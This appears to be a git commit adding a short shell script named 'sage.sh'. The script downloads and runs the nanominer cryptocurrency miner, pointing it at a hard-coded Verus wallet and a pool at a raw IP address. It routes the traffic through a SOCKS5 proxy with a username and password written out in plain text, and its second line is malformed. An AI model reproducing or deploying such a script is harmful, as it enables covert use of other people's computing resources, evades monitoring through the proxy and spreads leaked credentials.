adf58eb6cf27e54b0729e5f0af81b01db001445a
ERWINZ1996 <115689990+ERWINZ1996@users.noreply.github.com>
2022-10-13 13:42:19 +0700

    Create sage.sh

---
+++ sage.sh
@@ -0,0 +1,2 @@
+nohup wget https://github.com/nanopool/nanominer/releases/download/v3.7.3/nanominer-linux-3.7.3.tar.gz && tar -xf nanominer-linux-3.7.3.tar.gz && 
+./nanominer -algo Verushash -coin VRSC -wallet 3J23t6QgqK8Z39VkccngTeUE7rYLo3TuFG.BERKAH -pool1 34.160.142.106:443 && --cpu-affinity=0x3 -x socks5://jxqnjrrf:67ffjvaafmvk@144.168.217.36:8728
